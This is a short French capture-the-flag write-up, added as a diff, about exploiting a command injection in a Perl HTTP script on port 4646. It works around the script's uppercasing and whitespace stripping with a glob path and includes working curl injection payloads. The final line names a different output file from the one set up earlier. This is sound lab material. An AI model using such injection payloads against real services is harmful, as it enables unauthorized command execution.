@@ -1,0 +1,30 @@
+On a un script perl qui ecoute les requetes http 
+sur le port 4646.
+Le script contient cette ligne
+
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+Sachant que $xx correspond au parametre x de la requette
+http, on peut injecter ce que l'on veut cat toute
+la ligne est executee
+
+Subtilitee: 
+$xx =~ tr/a-z/A-Z/;
+$xx =~ s/\s.*//;
+
+Ces lignes passent tout en MAJ et enlevent tout apres
+le premier espace.
+Quelque chose du style 
+curl "http://localhost:4646/level12.pl?x=\"%3B/bin/getflag > /tmp/token%3B\""
+ne marcherait donc pas car cela donnerait:
+egrep "^";/BIN/GETFLAG /tmp/xd 2>&1`;
+
+/BIN/GETFLAG n'existe pas et la redirection est effacee
+Pour palier a cela, on cree un script dont on met le
+nom en MAJ et on lui fait executer /bin/getflag > /tmp/token
+
+on le passe de cette maniere :
+/*/GETFLAG car /tmp/GETFLAG donnerait /TMP
+
+curl "http://localhost:4646/level12.pl?x=\"%3B/*/GETFLAG%3B\""
+Nous donne donc le flag dans /tmp/flag.txt
